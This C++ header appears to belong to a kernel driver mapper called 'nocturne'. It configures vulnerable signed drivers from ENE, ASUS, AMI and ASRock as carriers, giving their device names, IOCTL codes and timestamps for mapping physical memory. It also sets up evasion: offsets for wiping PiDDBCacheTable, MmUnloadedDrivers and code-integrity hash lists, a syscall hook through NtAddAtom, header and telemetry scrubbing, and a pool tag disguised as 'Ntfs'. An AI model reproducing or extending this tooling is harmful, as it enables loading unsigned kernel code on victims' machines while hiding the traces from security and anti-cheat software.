#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include <fstream>
#include <sstream>
#include <unordered_map>

namespace nocturne {

enum class CarrierKind : uint32_t {
    EneIo = 0,       // ENE Technology Inc. (ene.sys / WinIo64) - Physical section / MmMapIoSpace
    Atszio64 = 1,    // ASUSTeK Computer Inc. (ATSZIO64.sys) - MmMapIoSpace / UnmapIoSpace
    Amifldrv64 = 2,  // AMI Firmware Driver (amifldrv64.sys) - MmMapIoSpace
    GlckIo2 = 3,     // ASRock / Polychrome (GLCKIO2.sys) - Physical memory map
    Custom = 99      // Operator-defined IOCTL & layout loaded from config file
};

enum class PacketFormat : uint32_t {
    WinIoStruct = 0,   // { uint64_t size, uint64_t physAddr, uint64_t secHandle, uint64_t mappedVa, uint64_t objHandle }
    AsusStruct = 1,    // { uint64_t reserved, uint64_t mappedVa, uint64_t physAddr, uint32_t size, uint32_t pad }
    AmiStruct = 2      // { uint64_t physAddr, uint64_t mappedVa, uint32_t size, uint32_t flags }
};

struct CarrierProfile {
    CarrierKind kind = CarrierKind::EneIo;
    PacketFormat format = PacketFormat::WinIoStruct;
    std::wstring name = L"EneIo";
    std::wstring serviceName = L"EneTechIo";
    std::wstring deviceLink = L"\\\\.\\EneIo";
    uint32_t ioctlMapPhys = 0x80102040;
    uint32_t ioctlUnmapPhys = 0x80102044;
    uint32_t timeDateStamp = 0x5A9787C5; // Default ENE signed driver timestamp (overridable via config or PE header)
};

struct SymbolConfig {
    // Optional explicit RVA overrides (0 = resolve dynamically via signature scan in ntoskrnl.exe / ci.dll)
    uint64_t rvaPiDDBLock = 0;
    uint64_t rvaPiDDBCacheTable = 0;
    uint64_t rvaMmUnloadedDrivers = 0;
    uint64_t rvaMmLastUnloadedDriver = 0;
    uint64_t rvaKernelHashBucketList = 0;
    uint64_t rvaHashCacheLock = 0;
    uint64_t rvaMmAllocateIndependentPagesEx = 0;
    uint64_t rvaMmFreeIndependentPages = 0;
    uint64_t rvaMiGetPteAddress = 0;
    uint64_t explicitSystemCr3 = 0;
    std::string syscallHookExport = "NtAddAtom";
};

struct MapperConfig {
    CarrierProfile carrier;
    SymbolConfig symbols;
    bool useIndependentPages = true;
    bool scrubHeaders = true;
    bool scrubTelemetry = true;
    uint32_t poolTag = 'sftN'; // 'Ntfs'

    static CarrierProfile Preset(CarrierKind kind) {
        CarrierProfile p;
        p.kind = kind;
        switch (kind) {
            case CarrierKind::EneIo:
                p.format = PacketFormat::WinIoStruct;
                p.name = L"ene.sys";
                p.serviceName = L"EneTechIo";
                p.deviceLink = L"\\\\.\\EneIo";
                p.ioctlMapPhys = 0x80102040;
                p.ioctlUnmapPhys = 0x80102044;
                p.timeDateStamp = 0x5A9787C5;
                break;
            case CarrierKind::Atszio64:
                p.format = PacketFormat::AsusStruct;
                p.name = L"ATSZIO64.sys";
                p.serviceName = L"ATSZIO";
                p.deviceLink = L"\\\\.\\ATSZIO";
                p.ioctlMapPhys = 0x8807200C;
                p.ioctlUnmapPhys = 0x88072010;
                p.timeDateStamp = 0x52FB3B5B;
                break;
            case CarrierKind::Amifldrv64:
                p.format = PacketFormat::AmiStruct;
                p.name = L"amifldrv64.sys";
                p.serviceName = L"amifldrv";
                p.deviceLink = L"\\\\.\\amifldrv64";
                p.ioctlMapPhys = 0x80002010;
                p.ioctlUnmapPhys = 0x80002014;
                p.timeDateStamp = 0x58B665A4;
                break;
            case CarrierKind::GlckIo2:
                p.format = PacketFormat::WinIoStruct;
                p.name = L"GLCKIO2.sys";
                p.serviceName = L"GLCKIO2";
                p.deviceLink = L"\\\\.\\GLCKIO2";
                p.ioctlMapPhys = 0x80102040;
                p.ioctlUnmapPhys = 0x80102044;
                p.timeDateStamp = 0x5C8603C1;
                break;
            default:
                break;
        }
        return p;
    }

    bool LoadFromFile(const std::wstring& path) {
        std::ifstream f(path);
        if (!f.is_open()) return false;
        std::string line;
        while (std::getline(f, line)) {
            auto pos = line.find('#');
            if (pos != std::string::npos) line.resize(pos);
            auto eq = line.find('=');
            if (eq == std::string::npos) continue;
            auto trim = [](std::string s) {
                while (!s.empty() && isspace((unsigned char)s.front())) s.erase(s.begin());
                while (!s.empty() && isspace((unsigned char)s.back())) s.pop_back();
                return s;
            };
            std::string k = trim(line.substr(0, eq));
            std::string v = trim(line.substr(eq + 1));
            if (v.empty()) continue;

            auto toU64 = [](const std::string& s) -> uint64_t {
                return std::strtoull(s.c_str(), nullptr, 0);
            };
            auto toWStr = [](const std::string& s) -> std::wstring {
                return std::wstring(s.begin(), s.end());
            };

            if (k == "carrier.deviceLink") carrier.deviceLink = toWStr(v);
            else if (k == "carrier.serviceName") carrier.serviceName = toWStr(v);
            else if (k == "carrier.name") carrier.name = toWStr(v);
            else if (k == "carrier.ioctlMapPhys") carrier.ioctlMapPhys = static_cast<uint32_t>(toU64(v));
            else if (k == "carrier.ioctlUnmapPhys") carrier.ioctlUnmapPhys = static_cast<uint32_t>(toU64(v));
            else if (k == "carrier.timeDateStamp") carrier.timeDateStamp = static_cast<uint32_t>(toU64(v));
            else if (k == "carrier.packetFormat") carrier.format = static_cast<PacketFormat>(toU64(v));
            else if (k == "symbols.rvaPiDDBLock") symbols.rvaPiDDBLock = toU64(v);
            else if (k == "symbols.rvaPiDDBCacheTable") symbols.rvaPiDDBCacheTable = toU64(v);
            else if (k == "symbols.rvaMmUnloadedDrivers") symbols.rvaMmUnloadedDrivers = toU64(v);
            else if (k == "symbols.rvaMmLastUnloadedDriver") symbols.rvaMmLastUnloadedDriver = toU64(v);
            else if (k == "symbols.rvaKernelHashBucketList") symbols.rvaKernelHashBucketList = toU64(v);
            else if (k == "symbols.rvaHashCacheLock") symbols.rvaHashCacheLock = toU64(v);
            else if (k == "symbols.rvaMmAllocateIndependentPagesEx") symbols.rvaMmAllocateIndependentPagesEx = toU64(v);
            else if (k == "symbols.rvaMiGetPteAddress") symbols.rvaMiGetPteAddress = toU64(v);
            else if (k == "symbols.explicitSystemCr3") symbols.explicitSystemCr3 = toU64(v);
            else if (k == "symbols.syscallHookExport") symbols.syscallHookExport = v;
            else if (k == "mapper.useIndependentPages") useIndependentPages = (v == "1" || v == "true");
            else if (k == "mapper.scrubHeaders") scrubHeaders = (v == "1" || v == "true");
            else if (k == "mapper.scrubTelemetry") scrubTelemetry = (v == "1" || v == "true");
        }
        return true;
    }
};

} // namespace nocturne
